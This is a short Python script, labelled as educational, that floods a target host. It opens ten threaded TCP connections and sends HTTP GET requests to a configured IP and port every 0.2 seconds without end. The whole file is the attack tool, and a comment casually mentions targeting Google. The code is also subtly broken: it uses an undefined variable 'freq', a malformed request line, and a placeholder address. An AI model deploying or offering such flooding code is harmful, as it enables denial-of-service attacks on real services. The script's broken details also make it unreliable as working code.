##################################################
# For educational purposese only !!!             #
# Do not hack anyone without a legal consent !!! #
##################################################

import threading
import socket 
from time import sleep

IP                  = '0.0.0.0'
PORT                = 9999
MAX_CONNECTIONS     = 10
REQUEST             = "GET /HTTP/1.1\r\nHost: google.com\r\n\r\n" # Hacking google like this is borderline imposible
FREQ                = 0.2 #sec

def attack():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))
    while True:
        print('+')
        s.send(REQUEST.encode('utf-8'))
        sleep(freq)

for i in range(MAX_CONNECTIONS):
    threading.Thread(target=attack, daemon=True).start()

while(True):
    pass
